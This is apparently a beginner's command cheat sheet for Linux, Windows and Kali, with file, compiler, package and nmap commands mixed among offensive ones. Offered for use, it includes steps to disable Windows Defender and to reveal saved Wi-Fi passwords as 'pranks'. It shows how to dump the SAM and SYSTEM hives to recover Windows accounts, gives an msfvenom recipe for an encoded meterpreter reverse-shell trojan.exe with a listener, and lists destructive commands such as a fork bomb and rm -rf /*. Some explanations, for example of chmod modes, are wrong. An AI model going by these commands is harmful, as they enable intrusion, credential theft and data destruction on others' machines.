/*

                                               to disable window difender 
---{Set-MpPreference -DisableRealtimeMonitoring $true}







                                           pranks
---{netsh wlan show profile}<show all the wifi your computer has been connected
---{netsh wlan show profile wifiname key=clear}<show you the password of the wifi
---{shutdown -i}<to shut down computer connected to you
---{arp-a}<to see all the ip connencted to your wifi



how to copy sam and system file to c folder 
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system




                                       kalilinux commands
to download any thing in linux using links we use these commands << (git clone ,wget,curl

---{cd}<to move to an dir or simply write cd to move to home dir
---{ls}<to show what is in one dir
---{ls -l}<show what is in dir with detail----{-l}<long listng
---{ls -la}<show hiden files in dir
---{ls -a}<show all files
---{cd ..}<to move one step ack in dir
---{git clone {link}}<to clone tool from the github<<
---{pwd}<to know in which dir you are in
---{whoami}<to know with what usr you are logged in
---{cd ../..}<to move back 2 times in dir
---{--help or -h}<to need help for any command
---{scp } << command used to move file from one os to another using ssh
---{chown [owner] [filename]} << to change the ownership of any file

--------------------------convert cpp file to exe or assembly or preprocessed code-----------------
---{gcc or g++ -E -p [cpp file]} << is used to convert cpp file to preprocessed code where -E is used to convert cpp to preprocess and -p is used for making the printed code more readable
---{gcc or g++ -S -masm=intel [cpp file]} << to convert  the preprcessed or cpp file to assembly language where -S is used to convert cpp to assembly lan and where -masm=intel is used to convert AT&T sytext of linux assembly lang to intel assembly languagen and the out put file will have an .s extention
---{gcc or g++ -c [cpp file]} << is used to convert cpp or preprocessed or assembly file to an object file having .o extention 



---{file [file name]}  << it is used to see what kind of file we are dealing with
---{ldd [file name]}  << a handy tool used to find out the shared libraries required by a program. if not then will say not a dynamic executable 


The convention in Linux is to use a double dash (--) before
word options, such as help, and a single dash (-) before single­letter options, such as –h

---{man}<manuall for any command                                                                   ]
---{locate}<to find anything                                                                       ]
---{whereis {command}}<shows the path of the file containing the file                              ]>>>>>>>>>>all are to find any file on kali
---{which {command}}<to find which command is gona run if we type this command                     ]                         
---{find / -type f -name apache2}<"  "   "   "   "   "                                             ] 
---{find /{dir name in to search} -type f -name apache2}<to fast up result
wildcard <*.,?and []
---{find . -name {file name} type {f or d}}<to find from your working dir the . shows to start find from here and f mean file and d mean dir
---{ps}<used to give you details of commands runing in background
---{grep {search} {text file}}<to search for any word on the txt file
---{{cat or find or anyfile} path file name | grep -v {word to filter}}<to filter your search the -v is used to filter
---{cat {text file} | grep {txt}}<to show content that contain txt
---{ps aux| grep apache2}<aux is an option to the ps
---{cat {txt}}<to read the txt file 
---{cat or echo > {txt name}}<to create a file or to over write a file
---{cat or echo >> {txt file}}<to write more in txt 
---{touch {file name}}<to create new files
---{mkdir}<to make new dir
---{cp {path}}<to copy file from one place to another
---{mv {old name} {new name}}<to rename file or dir
---{rm {file name}}<to remove file 
---{rm -r {name}}<to remove dir


 ---------------------------------note:warning be very care full to use this as it may crash you linux
---{head}<to show first 10 lines of txt file
---{head -{no of lines}}<to see more than first 10 lines of the txt file
---{tail {txt file}}<to see last 10 lines of the file 
---{tail -{no of lines}}<to see more than 10 last lines
---{nl {file name or path}}<no of ines in the file
---{sed s/text to repace /text to be replced/g {path} > new file name {if you want to save the new content in new file so we then use < }
{the s is for search and the g opption is for to apply changes  globaly on the txt file}
---{cat , more & less are used to show what is in the text file}
---{less {file name}<when the result come press / and write the word to highlight in the txt file
---{vim {file}}<a text editor in linux
---{apt install hollywood} then {hollywood}<to look like an hacker in ubuntu
---{steghide embed -ef '/home/kali/Desktop/test.txt' -cf '/home/kali/Desktop/kali-linux-on-mobile.jpg' -p kali}<to embed txt file into jpg file
---{steghide extract -sf '/home/kali/Desktop/kali-linux-on-mobile.jpg' -p kali -xf '/home/kali/Desktop/tes2t.txt}<to extract txt file from jpg
---{steghide info file}<to wheter know if the jpg file is embeded or not
---{stegcracker {jpg} {wordlists}}<to crack the password of jpg -sf file
---{pip or python or pip3 or python3 {name of python script}},to install an tool which has .py at its end
---{gzip rockyou.txt.gz -d}<to unzip an ziped file
---{gcc file.c -o file}<to install software having .c extention at it end
---{systemctl status {service name}}<to know if a service is running or not
---{systemctl start or stop {sevice name}}<to start or stop a service
---{update-alternatives --config {java}}<to use previous version
---{ls -lah}<to see files in directory with details
---{ufw enable}<to enable firewall
---{ufw disable}<to disable firewall in kali
---{ufw enable or deny {port no or protocol name}<to deny any port
---{dpkg --get-selections}<to find all the installed apps in kalilinux
---{apt-get purge {app}}<to remove an app from kali
---{passwd}to change pass
---{passwd -u}<to enable account 
---{passwd -l}<to disable account
---{init 6}<to restart kali
---{dpkg-reconfigure kali-grant-root}<to disable passw for sudo su
---{chmod +x ./}
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                networking

---{ifconfig}<to get network information
---{iwconfig}<cheaking wireless networks 

---{eth0}<stand for ethernet0 it is the wired network connection
note:the linux start counting from 0
---{HWaddr}<this is the macadddr 
---{ifconfig {eth0 or wlan0 or "} {new ip addr}}<to change the ip addr 
---{ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast 192.168.1.255}<to chnge ip addr netmask and broadcast


----------------------------------------------------------------------------------------------------------------------------------------------

                                                                to enable wlan0mon
--{airmon-ng stop wlan0}<< to stop wlan0
--{iw wlan0 del}<< to temprarely delete wlan0 so we can replace it with wlan0mon
--{airmon-ng start wlan0mon}<< tostart wlan0mon in place of wlan0
--{rfkill list}<<to check if there is any blockage for wlanomon if yes the change it tio no by using
--{rfkill list unblockall}<<it will change all the options to yes
but some times wlaomon is still in maneged mode to convert it we need to enter more codes
--{airmon-ng check}<<to check all the running processes 
--{airmon-ng check kill}<< to kill all the running processes
--{airmon-ng start wlan0mon}<< to start wlan0mon in moniter mode




















>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>to make a malacious software using metasploit
---{service postgresql start}<to start an open source object relational data base system or to conect
---{msfconsole}<to start metasploit in linux
---{msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip addr} LPORT=5555 -f exe -e x86/shiata_ga_na -i 10 > trojan.exe} to create an exe file of trojan
---{use multi/handler}<to start lisning 
---{set payload windows/meterpreter/reverse_tcp}
---{set LHOST {ip addr}}
---{set LPORT 5555}
---{exploit}<to start :) :) :) :) :)


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>dangerous commands in linux
:(){ :|: & };:          <<<command used to freeze your linux os by starting all services
---{echo "hello world" > /dev/vda or sda}<to crash linux
---{rm -rf /*}   warning neve ever ever run on your linux
---{sudo chmod -R 000 /dir}<to make any file unreadable
---{sudo chmod -R 755 /dir}<to make any thing readable and editable for everyone with out permision 
---{sudo chmod -R 644 /dir}<to make any thing readable to the user with passwd
---{sudo chmod -R 000 /}<to crash the whole system



>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  apt package manager, GUI­ based installation managers, and git
installation of softwares

                    apt(Advanced Packaging Tool)
---{apt-get install [software name]}<to install softfare 
---{apt-get update }<to update your kali linux 
---{apt­-cache search {software name}}<to know if software is available or not in your operating system’s default repository 
---{apt-get remove {software name}}<toremove any softfare from your os








>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> how to know the password of win using sam file in system32 
first we need to copy the sam file using cmd 
use command
---{reg save HKLM\SAM C:\sam}
---{reg save HKLM\SYSTEM C:\system}
it will copy sam and system file in c folder
than copy the sam file to kali
to find the password use the following commands
---{chntpw -l sam}<to find all the users
---{chntpw -u username}<to edit an user







>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  nmap & related to networking
---{nslookup {ip or link} >> txt file}< to know the name or ip of domain name
---{nmap -A {ip or link} >> text}< to detect service detection, traceroute, and OS detection
---{nmap -sV {ip or link} >>text}<allow user to collect information of the os, service type and hostname of the ip or website
---{namp -F {ip or link} >> text}<fast scaning 
---{nmap --open {ip or link} >> text}<only show the open ports 


*/

